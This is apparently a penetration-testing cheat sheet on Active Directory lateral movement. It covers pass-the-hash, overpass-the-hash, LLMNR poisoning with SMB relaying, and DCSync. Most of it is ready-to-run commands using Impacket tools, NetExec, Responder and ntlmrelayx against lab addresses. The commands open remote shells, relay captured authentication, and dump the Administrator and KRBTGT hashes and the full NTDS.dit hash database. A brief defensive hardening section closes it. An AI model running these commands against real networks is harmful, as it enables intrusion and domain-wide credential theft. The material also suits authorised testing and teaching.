# 🔄 Lateral Movement & Relaying Tradecraft

Lateral movement allows an adversary to extend access from an initial compromised workstation to adjacent servers, database clusters, and domain controllers across the network.

---

### Pass-the-Hash (PtH)

#### Protocol Mechanics
NTLM authentication does not transmit plaintext passwords across the wire; it uses a challenge-response handshake based directly on the user's NTLM hash. Therefore, possessing the 32-character hexadecimal NTLM hash is functionally identical to knowing the plaintext password.

```bash
# Execute remote shell over WMI without cmd.exe or interactive services
wmiexec.py -hashes :7c4a8d09ca3762af61e59520943dc264 CORP.LOCAL/svc_sql@192.168.56.21

# Execute remote commands using SMB Named Pipes (creates a temporary Windows service)
psexec.py -hashes :7c4a8d09ca3762af61e59520943dc264 CORP.LOCAL/svc_sql@192.168.56.21

# Execute commands via remote Scheduled Tasks (RPC)
atexec.py -hashes :7c4a8d09ca3762af61e59520943dc264 CORP.LOCAL/svc_sql@192.168.56.21 "whoami /all"

# NetExec mass execution across IP range
nxc smb 192.168.56.0/24 -u 'svc_sql' -H '7c4a8d09ca3762af61e59520943dc264' -x "whoami"
```

---

### Overpass-the-Hash / Pass-the-Key (PtK)

When NTLM authentication is disabled or restricted in an enterprise, Overpass-the-Hash converts an NTLM hash or AES key into a valid Kerberos Ticket Granting Ticket (TGT).

```bash
# Request TGT using NTLM hash with getTGT.py
getTGT.py -hashes :7c4a8d09ca3762af61e59520943dc264 CORP.LOCAL/svc_sql

# Set Kerberos ticket cache environment variable
export KRB5CCNAME=svc_sql.ccache

# Authenticate using Kerberos across Impacket tools (-k -no-pass)
wmiexec.py -k -no-pass -dc-ip 192.168.56.10 CORP.LOCAL/svc_sql@CORP-WS02.corp.local
```

---

### SMB Relaying & LLMNR Poisoning

#### Attack Topology
When a workstation queries a non-existent network share (e.g. `\\fileshare`), it falls back to Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS). 

An attacker on the same local broadcast domain poisons this response using `Responder`, intercepts the incoming NTLM authentication, and relays it to an adjacent target where **SMB Signing is disabled**.

```text
[Victim Workstation]  ---- 1. Multicast LLMNR "Where is \\fileshare?" ----> [Broadcast Domain]
                                                                                   |
[Attacker (Responder)] <-----------------------------------------------------------+
        |
        | --- 2. Poisoned Response: "I am \\fileshare!" ------------------> [Victim Workstation]
        v
[Victim Workstation]  ---- 3. NTLMv2 Authentication Handshake ------------> [Attacker (ntlmrelayx)]
                                                                                   |
[Target Server (SMB Signing Disabled)] <--- 4. Forwarded Authenticated Session ----+
        |
        +---> Dumps SAM hashes or executes interactive payload!
```

#### Step-by-Step Operator Setup

```bash
# 1. Edit /etc/responder/Responder.conf -> Disable SMB and HTTP servers
# (Set SMB = Off, HTTP = Off so ntlmrelayx can bind to ports 445 and 80)

# 2. Start Responder to poison LLMNR / NBT-NS broadcasts
sudo responder -I eth0 -dwv

# 3. In another terminal, generate targets list of machines with SMB signing disabled
nxc smb 192.168.56.0/24 --gen-relay-list targets.txt

# 4. Start ntlmrelayx to capture and forward authentication
sudo ntlmrelayx.py -tf targets.txt -smb2support -socks
```

---

### DCSync: Domain Forest Compromise

#### Theoretical Mechanics
DCSync mimics the behavior of a genuine Domain Controller using the **Directory Replication Service Remote Protocol (MS-DRSR)** via RPC. 

If an account possesses the extended rights `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`, it can request password hashes directly from the Active Directory database (`NTDS.dit`) without executing code on the Domain Controller itself.

```bash
# Dump Domain Administrator NTLM hash via DCSync
secretsdump.py CORP.LOCAL/itadmin:'AdminMaster2025!'@192.168.56.10 -just-dc-user Administrator

# Dump KRBTGT account hash (required for Golden Ticket generation)
secretsdump.py CORP.LOCAL/itadmin:'AdminMaster2025!'@192.168.56.10 -just-dc-user krbtgt

# Full NTDS.dit dump (all domain user hashes)
secretsdump.py CORP.LOCAL/itadmin:'AdminMaster2025!'@192.168.56.10 -just-dc-ntds
```

---

### Blue Team Defense & Remediation

> [!WARNING]
> **Hardening Directives:**
> 1. **Enforce SMB Signing**: Enable mandatory SMB signing via GPO:
>    `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options -> Microsoft network server: Digitally sign communications (always)`. This terminates SMB relay attacks completely.
> 2. **Disable LLMNR & NBT-NS**:
>    Turn off multicast name resolution via GPO (`Administrative Templates -> Network -> DNS Client -> Turn off multicast name resolution`).
> 3. **Deploy LAPS (Local Administrator Password Solution)**: Randomize local administrator passwords across every workstation and server to eliminate Pass-the-Hash lateral movement.
> 4. **Tiered Administration Model**: Enforce Tier 0 / Tier 1 / Tier 2 workstation boundaries; Domain Admins must never log onto Tier 1 workstations where hashes can be harvested from `lsass.exe`.
